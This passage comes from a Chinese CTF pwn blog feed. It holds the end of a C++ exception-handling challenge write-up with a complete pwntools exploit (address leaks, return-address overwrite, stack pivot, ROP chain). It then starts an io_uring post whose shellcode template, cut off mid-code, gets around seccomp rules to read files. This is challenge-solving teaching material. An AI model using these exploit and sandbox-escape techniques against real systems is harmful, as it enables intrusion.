size&amp;rdquo;**&lt;/li&gt;&#xA;&lt;li&gt;leave中如果检测到size大于0x10就会抛出**&amp;ldquo;stack overflow&amp;rdquo;**&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;&lt;code&gt;leave&lt;/code&gt;和&lt;code&gt;visit&lt;/code&gt;中都没有&lt;code&gt;catch&lt;/code&gt;，&lt;code&gt;main&lt;/code&gt;中有两个&lt;code&gt;catch(char const*)&lt;/code&gt;，抛出异常后都会stack unwinding，然后到main中处理&lt;/p&gt;&#xA;&lt;p&gt;其中一个catch会泄露libc地址和栈地址&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;....&#xA;mov     rax, cs:setbuf_ptr&#xA;mov     rsi, rax&#xA;lea     rax, format     ; &amp;#34;setbufaddr:%p\n&amp;#34;&#xA;mov     rdi, rax        ; format&#xA;mov     eax, 0&#xA;call    _printf&#xA;lea     rax, [rbp&amp;#43;var_2C]&#xA;mov     rsi, rax&#xA;lea     rax, aStackaddrP ; &amp;#34;stackaddr:%p\n&amp;#34;&#xA;mov     rdi, rax        ; format&#xA;mov     eax, 0&#xA;call    _printf&#xA;;   } // starts at 401FAD&#xA;call    ___cxa_end_catch&#xA;jmp     loc_401ED4&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;抛出异常的时候并不会调用另一个catch：&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;loc_401F2B:             ; void *&#xA;mov     rdi, rax&#xA;call    ___cxa_begin_catch&#xA;mov     [rbp&amp;#43;var_20], rax&#xA;;   try {&#xA;call    write_shellcode&#xA;;   } // starts at 401F37&#xA;nop&#xA;call    ___cxa_end_catch&#xA;call    enterflag_writerbp&#xA;mov     eax, 0&#xA;mov     rdx, [rbp&amp;#43;var_18]&#xA;sub     rdx, fs:28h&#xA;jz      loc_402060&#xA;loc_402060:&#xA;mov     rbx, [rbp&amp;#43;var_8]&#xA;leave&#xA;retn&#xA;; } // starts at 401EB3&#xA;main endp&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;enterflag_writerbp&lt;/code&gt;中的另一个catch就是执行leave;ret（给了栈迁移的思路）&lt;/p&gt;&#xA;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/img/C&amp;#43;&amp;#43;pwn/canutrytry/catch.png&#34; title=&#34;图片显示错误&#34; data-thumbnail=&#34;/img/C&amp;#43;&amp;#43;pwn/canutrytry/catch.png&#34; data-sub-html=&#34;&lt;h2&gt;图片显示错误&lt;/h2&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/img/C++pwn/canutrytry/catch.png&#39; alt=&#34;图片显示错误&#34; height=&#34;800px&#34; width=&#34;800px&#34;&gt;&lt;/a&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;思路过程&#34;&gt;&lt;span&gt;思路过程&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#%e6%80%9d%e8%b7%af%e8%bf%87%e7%a8%8b&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h3&gt;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;首先，泄露出libc和栈地址&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;leave中栈溢出写retaddr为这个try内的地址（就能去调用到那个不会被调用到的catch）&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;.text:0000000000401ED4 ;   try {&#xA;.text:0000000000401ED4                 call    menu&#xA;.text:0000000000401ED4 ;   } // starts at 401ED4&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;接着写入rop链，栈迁移到这里执行rop链&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;exp:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;from pwn import *&#xA;context.terminal = [&amp;#34;tmux&amp;#34;, &amp;#34;splitw&amp;#34;, &amp;#34;-h&amp;#34;]&#xA;context(os=&amp;#39;linux&amp;#39;,arch=&amp;#39;amd64&amp;#39;,log_level=&amp;#39;debug&amp;#39;)&#xA;&#xA;address = &amp;#39;./pwn&amp;#39;&#xA;&#xA;elf = ELF(address)&#xA;libc = elf.libc&#xA;&#xA;gdbscript = \&#xA;&amp;#34;&amp;#34;&amp;#34;&#xA;    bp 0x4019d1&#xA;    c&#xA;&amp;#34;&amp;#34;&amp;#34;&#xA;if len(sys.argv) &amp;gt; 1 and sys.argv[1] == &amp;#34;r&amp;#34;:&#xA;    p = remote(&amp;#34;192.168.0.1&amp;#34;,8000 )&#xA;elif len(sys.argv) &amp;gt; 1 and sys.argv[1] == &amp;#34;d&amp;#34;:&#xA;    p = gdb.debug(address, gdbscript = gdbscript)&#xA;else:&#xA;    p = process(address)&#xA;&#xA;def dbg():&#xA;    gdb.attach(p)&#xA;    # pause()&#xA;&#xA;def cmd(choice):&#xA;    p.sendlineafter(b&amp;#39;&amp;gt;&amp;gt;&amp;#39;,str(choice).encode())&#xA;&#xA;def leave(index):&#xA;    cmd(2)&#xA;    p.sendlineafter(b&amp;#39;index: &amp;#39;,str(index).encode())&#xA;&#xA;def left():&#xA;    cmd(1)&#xA;    p.sendlineafter(b&amp;#39;&amp;gt;&amp;gt;&amp;#39;,b&amp;#39;1&amp;#39;)&#xA;&#xA;def right(size):&#xA;    cmd(1)&#xA;    p.sendlineafter(b&amp;#39;&amp;gt;&amp;gt;&amp;#39;,b&amp;#39;2&amp;#39;)&#xA;    p.sendlineafter(b&amp;#39;size:&amp;#39;,str(size).encode())&#xA;&#xA;def stright(index,content):&#xA;    cmd(1)&#xA;    p.sendlineafter(b&amp;#39;&amp;gt;&amp;gt;&amp;#39;,b&amp;#39;3&amp;#39;)&#xA;    p.sendlineafter(b&amp;#39;index:&amp;#39;,str(index))&#xA;    p.sendafter(b&amp;#39;content:&amp;#39;,content)&#xA;&#xA;&#xA;right(0x30)&#xA;right(-1)&#xA;left()&#xA;left()&#xA;p.recvuntil(b&amp;#39;setbufaddr:&amp;#39;)&#xA;libc.address = int(p.recv(14),16) - 0x88060&#xA;p.recvuntil(b&amp;#39;stackaddr:&amp;#39;)&#xA;stack = int(p.recv(14),16)&#xA;success(&amp;#34;libc -&amp;gt; 0x%x&amp;#34;,libc.address)&#xA;success(&amp;#34;stack -&amp;gt; 0x%x&amp;#34;,stack)&#xA;pl = b&amp;#39;a&amp;#39;*0x20 &amp;#43; p64(stack-0x14) &amp;#43; p64(0x401ED4&amp;#43;1) #不能破坏栈&#xA;stright(0,pl)&#xA;leave(0)&#xA;&#xA;#进入另一个catch&#xA;p.recvuntil(b&amp;#39;now!\n&amp;#39;)&#xA;#write(2,0x4053c0,0x20)&#xA;flag_addr = 0x4053c0&#xA;#shellcode_addr = 0x405460&#xA;pop_rax_ret = 0x45eb0 &amp;#43; libc.address&#xA;pop_rdi_ret = 0x2a3e5&amp;#43; libc.address&#xA;pop_rsi_ret = 0x2be51  &amp;#43; libc.address&#xA;pop_rdx_r12_ret = 0x11f497&amp;#43; libc.address&#xA;rop = p64(0xdeedbeef)&#xA;rop &amp;#43;= p64(pop_rdi_ret) &amp;#43; p64(2)&#xA;rop &amp;#43;= p64(pop_rsi_ret) &amp;#43; p64(flag_addr)&#xA;rop &amp;#43;= p64(pop_rdx_r12_ret) &amp;#43; p64(0x100)*2&#xA;rop &amp;#43;= p64(libc.symbols[&amp;#39;write&amp;#39;])&#xA;&#xA;p.send(rop)&#xA;&#xA;# pl = p64(0x405460)&#xA;pl = b&amp;#39;flag&amp;#39;&#xA;p.sendafter(b&amp;#39;flag: &amp;#39;,pl) #0x405400 -&amp;gt; 0x405460(rop)&#xA;&#xA;&#xA;pl = b&amp;#39;a&amp;#39;*0x10 &amp;#43; p64(0x405460)&#xA;# dbg()&#xA;p.send(pl)&#xA;&#xA;p.interactive()&#xA;# 0x0000000000045eb0 : pop rax ; ret&#xA;# 0x000000000002a3e5 : pop rdi ; ret&#xA;# 0x000000000002be51 : pop rsi ; ret&#xA;# 0x000000000011f497 : pop rdx ; pop r12 ; ret&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;参考文章&#34;&gt;&lt;span&gt;参考文章&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#%e5%8f%82%e8%80%83%e6%96%87%e7%ab%a0&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;p&gt;《C++.Primer.5th.Edition_2013》&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://en.cppreference.com/w/cpp/language/try.html&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;https://en.cppreference.com/w/cpp/language/try.html&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://bbs.kanxue.com/thread-284745.htm&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;https://bbs.kanxue.com/thread-284745.htm&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://c-lby.top/2024/cpp-exception/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;C++异常处理机制及其利用研究&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>io_uring</title>
      <link>http://localhost:1313/posts/io_uring/</link>
      <pubDate>Sat, 23 Aug 2025 13:56:19 +0800</pubDate>
      <guid>http://localhost:1313/posts/io_uring/</guid>
      <category domain="http://localhost:1313/categories/pwn/">Pwn</category>
      <description>&lt;p&gt;突破沙箱规则，实现orw&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;基础知识&#34;&gt;&lt;span&gt;基础知识&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#%e5%9f%ba%e7%a1%80%e7%9f%a5%e8%af%86&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;code&gt;io_uring&lt;/code&gt;涉及三个系统调用&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;io_uring_setup(2)&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;io_uring_register(2)&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;io_uring_enter(2)&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;io_uring_setup&#34;&gt;&lt;span&gt;&lt;code&gt;io_uring_setup&lt;/code&gt;&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#io_uring_setup&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h3&gt;&lt;p&gt;用于初始化执行异步IO的上下文&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;       #include &amp;lt;liburing.h&amp;gt;&#xA;&#xA;       int io_uring_setup(u32 entries, struct io_uring_params *p);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这个系统调用&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;创建一个 SQ 和一个 CQ&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;返回一个文件描述符，随后作为其他相关系统调用的参数&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;SQ 和 CQ 在应用和内核之间共享（需要用到mmap，还需要mmap SQEs），避免了在初始化和完成 I/O 时（initiating and completing I/O）拷贝数据。&lt;/p&gt;&#xA;&lt;p&gt;参数：&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;code&gt;entries&lt;/code&gt;参数：&#xA;设置SQ和CQ的初始容量&lt;strong&gt;至少&lt;/strong&gt;为&lt;code&gt;entries&lt;/code&gt;（至少是因为&lt;code&gt;entries&lt;/code&gt;必须是2的幂次方（如32、64、512等），如果不是内核也会&lt;strong&gt;自动对齐到最近的更大幂次值&lt;/strong&gt;（如传入100会被调整为128））&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;code&gt;io_uring_params&lt;/code&gt;结构体：&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;一般都是把&lt;code&gt;io_uring_params&lt;/code&gt;初始化然后清零，再传入&lt;code&gt;io_uring_setup&lt;/code&gt;，内核再将一些返回的信息写入这个结构体&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;struct io_uring_params {&#xA;    __u32 sq_entries;          // 实际提交队列（SQ）大小&#xA;    __u32 cq_entries;          // 实际完成队列（CQ）大小&#xA;    __u32 flags;               // 创建 io_uring 的标志（由用户指定），为0采用中断驱动模式&#xA;    __u32 sq_thread_cpu;       // SQ polling 线程绑定的 CPU&#xA;    __u32 sq_thread_idle;      // SQ polling 线程空闲休眠时间&#xA;    __u32 features;            // 内核支持的特性标志&#xA;    __u32 wq_fd;               // 共享 workqueue 的 io_uring 实例 fd&#xA;    __u32 resv[3];             // 保留字段,必须为0&#xA;    struct io_sqring_offsets sq_off;   // SQ 环形队列的偏移信息&#xA;    struct io_cqring_offsets cq_off;   // CQ 环形队列的偏移信息&#xA;};&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;struct io_sqring_offsets {&#xA;    __u32 head;        // SQ 的 head 指针（用户态消费，内核读取）&#xA;    __u32 tail;        // SQ 的 tail 指针（用户态生产，内核读取）&#xA;    __u32 ring_mask;   // 环大小掩码，用于索引取模&#xA;    __u32 ring_entries;// SQ ring 的 entry 总数&#xA;    __u32 flags;       // SQ 状态标志位&#xA;    __u32 dropped;     // 内核丢弃的 SQE 数量&#xA;    __u32 array;       // SQE 索引数组（存放 SQE 的顺序）&#xA;    __u32 resv1;       // 保留字段&#xA;    __u64 user_addr;   // 用户自定义地址（较新内核引入）&#xA;};&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;struct io_cqring_offsets {&#xA;    __u32 head;        // CQ 的 head 指针（用户态消费）&#xA;    __u32 tail;        // CQ 的 tail 指针（内核生产）&#xA;    __u32 ring_mask;   // 环大小掩码，用于索引取模&#xA;    __u32 ring_entries;// CQ ring 的 entry 总数&#xA;    __u32 overflow;    // CQ 溢出计数&#xA;    __u32 cqes;        // CQE 数组起始偏移&#xA;    __u32 flags;       // CQ 状态标志&#xA;    __u32 resv1;       // 保留&#xA;    __u64 user_addr;   // 用户自定义地址&#xA;};&lt;/code&gt;&lt;/pre&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;io_uring_enter&#34;&gt;&lt;span&gt;&lt;code&gt;io_uring_enter&lt;/code&gt;&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#io_uring_enter&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;       #include &amp;lt;liburing.h&amp;gt;&#xA;&#xA;       int io_uring_enter(unsigned int fd, unsigned int to_submit,&#xA;                          unsigned int min_complete, unsigned int flags,&#xA;                          sigset_t *sig);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这个系统调用用于初始化和完成（initiate and complete）I/O，使用共享的 SQ 和 CQ。 单次调用同时执行：&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;提交新的 I/O 请求&lt;/li&gt;&#xA;&lt;li&gt;等待 I/O 完成&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;参数：&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;fd&lt;/code&gt; 是 &lt;code&gt;io_uring_setup()&lt;/code&gt; 返回的文件描述符&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;to_submit&lt;/code&gt; 告知内核当前有多少个 SQE已准备就绪，可以立即被消费和提交&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;min_complete&lt;/code&gt;默认模式，会等待这个数量的 I/O 事件完成再返回&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;flags&lt;/code&gt;用于控制内核行为&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;sig&lt;/code&gt;设置进程的信号屏蔽状态，如：是否会被&lt;code&gt;Ctrl+c&lt;/code&gt;终止。进行orw的话，置0就行&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;&lt;strong&gt;io_uring_sqe&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;p&gt;用于传递IO操作的具体信息&lt;/p&gt;&#xA;&lt;p&gt;&lt;code&gt;opcode&lt;/code&gt;：决定执行什么操作，其中包含一些文件IO操作(如：一些等价于open、write的操作)、进程管理操作等&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;           /*&#xA;            * IO submission data structure (Submission Queue Entry)&#xA;            */&#xA;           struct io_uring_sqe {&#xA;                __u8 opcode;        /* type of operation for this sqe */&#xA;                __u8 flags;         /* IOSQE_ flags */&#xA;                __u16     ioprio;        /* ioprio for the request */&#xA;                __s32     fd;       /* file descriptor to do IO on */&#xA;                union {&#xA;                     __u64     off; /* offset into file */&#xA;                     __u64     addr2;&#xA;                     struct {&#xA;                          __u32     cmd_op;&#xA;                          __u32     __pad1;&#xA;                     };&#xA;                };&#xA;                union {&#xA;                     __u64     addr;     /* pointer to buffer or iovecs */&#xA;                     __u64     splice_off_in;&#xA;                     struct {&#xA;                          __u32     level;&#xA;                          __u32     optname;&#xA;                     };&#xA;                };&#xA;                __u32     len;      /* buffer size or number of iovecs */&#xA;                union {&#xA;                     __kernel_rwf_t rw_flags;&#xA;                     __u32          fsync_flags;&#xA;                     __u16          poll_events;   /* compatibility */&#xA;                     __u32          poll32_events; /* word-reversed for BE */&#xA;                     __u32          sync_range_flags;&#xA;                     __u32          msg_flags;&#xA;                     __u32          timeout_flags;&#xA;                     __u32          accept_flags;&#xA;                     __u32          cancel_flags;&#xA;                     __u32          open_flags;&#xA;                     __u32          statx_flags;&#xA;                     __u32          fadvise_advice;&#xA;                     __u32          splice_flags;&#xA;                     __u32          rename_flags;&#xA;                     __u32          unlink_flags;&#xA;                     __u32          hardlink_flags;&#xA;                     __u32          xattr_flags;&#xA;                     __u32          msg_ring_flags;&#xA;                     __u32          uring_cmd_flags;&#xA;                     __u32          waitid_flags;&#xA;                     __u32          futex_flags;&#xA;                     __u32          install_fd_flags;&#xA;                     __u32          nop_flags;&#xA;                };&#xA;                __u64     user_data;     /* data to be passed back at completion time */&#xA;                /* pack this to avoid bogus arm OABI complaints */&#xA;                union {&#xA;                     /* index into fixed buffers, if used */&#xA;                     __u16     buf_index;&#xA;                     /* for grouped buffer selection */&#xA;                     __u16     buf_group;&#xA;                } __attribute__((packed));&#xA;                /* personality to use, if used */&#xA;                __u16     personality;&#xA;                union {&#xA;                     __s32     splice_fd_in;&#xA;                     __u32     file_index;&#xA;                     __u32     optlen;&#xA;                     struct {&#xA;                          __u16     addr_len;&#xA;                          __u16     __pad3[1];&#xA;                     };&#xA;                };&#xA;                union {&#xA;                     struct {&#xA;                          __u64     addr3;&#xA;                          __u64     __pad2[1];&#xA;                     };&#xA;                     __u64     optval;&#xA;                     /*&#xA;                      * If the ring is initialized with IORING_SETUP_SQE128, then&#xA;                      * this field is used for 80 bytes of arbitrary command data&#xA;                      */&#xA;                     __u8 cmd[0];&#xA;                };&#xA;           };&lt;/code&gt;&lt;/pre&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;模板&#34;&gt;&lt;span&gt;模板&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#%e6%a8%a1%e6%9d%bf&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;from pwn import *&#xA;&#xA;&#xA;&amp;#34;&amp;#34;&amp;#34;&#xA;    rsp&amp;#43;0x100   0x078: struct io_uring_params params = {};&#xA;    rsp&amp;#43;0x200   0x008: uring_fd&#xA;    rsp&amp;#43;0x208   0x008: sq_ring ptr&#xA;    rsp&amp;#43;0x210   0x008: cq_ring ptr&#xA;    rsp&amp;#43;0x218   0x008: sqes ptr&#xA;    rsp&amp;#43;0x220   0x008: flag_fd&#xA;    rsp&amp;#43;0x300   0x100: buffer&#xA;&amp;#34;&amp;#34;&amp;#34;&#xA;shellcode = asm(&amp;#34;&amp;#34;&amp;#34;&#xA;/*视情况调整栈帧*/&#xA;    add rsp, 0x2000&#xA;/*int uring_fd = syscall(SYS_io_uring_setup, 16, &amp;amp;params);*/&#xA;    mov rax, 0&#xA;    lea rdi, [rsp&amp;#43;0x100]&#xA;    mov rcx, 15&#xA;    rep stosq&#xA;    mov rdi, 16&#xA;    lea rsi, [rsp&amp;#43;0x100]&#xA;    mov rax, 0x1a9&#xA;    syscall&#xA;/*unsigned char *sq_ring = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, uring_fd, IORING_OFF_SQ_RING);*/&#xA;    mov qword ptr [rsp&amp;#43;0x200], rax&#xA;    xor rdi, rdi&#xA;    mov rsi, 0x1000&#xA;    mov rdx, 3&#xA;    mov r10, 1&#xA;    mov r8, qword ptr [rsp&amp;#43;0x200]&#xA;    mov r9, 0&#xA;    mov rax, 9&#xA;    syscall&#xA;    mov qword ptr [rsp&amp;#43;0x208], rax&#xA;/*unsigned char *cq_ring = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, uring_fd, IORING_OFF_CQ_RING);*/&#xA;    xor rdi, rdi&#xA;    mov rsi, 0x1000&#xA;    mov rdx, 3&#xA;    mov r10, 1&#xA;    mov r8, qword ptr [rsp&amp;#43;0x200]&#xA;    mov r9, 0x8000000&#xA;    mov rax, 9&#xA;    syscall&#xA;    mov qword ptr [rsp&amp;#43;0x210], rax&#xA;/*struct io_uring_sqe *sqes = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, uring_fd, IORING_OFF_SQES);*/&#xA;    xor rdi, rdi&#xA;    mov rsi, 0x1000&#xA;    mov rdx, 3&#xA;    mov r10, 1&#xA;    mov r8, qword ptr [rsp&amp;#43;0x200]&#xA;    mov r9, 0x10000000&#xA;    mov rax, 9&#xA;    syscall&#xA;    mov qword ptr [rsp&amp;#43;0x218], rax&#xA;&#xA;/*openat*/&#xA;    mov rax, 0&#xA;    mov rdi, qword ptr [rsp&amp;#43;0x218]&#xA;    mov rcx, 8&#xA;    rep stosq&#xA;    mov rdi, qword ptr 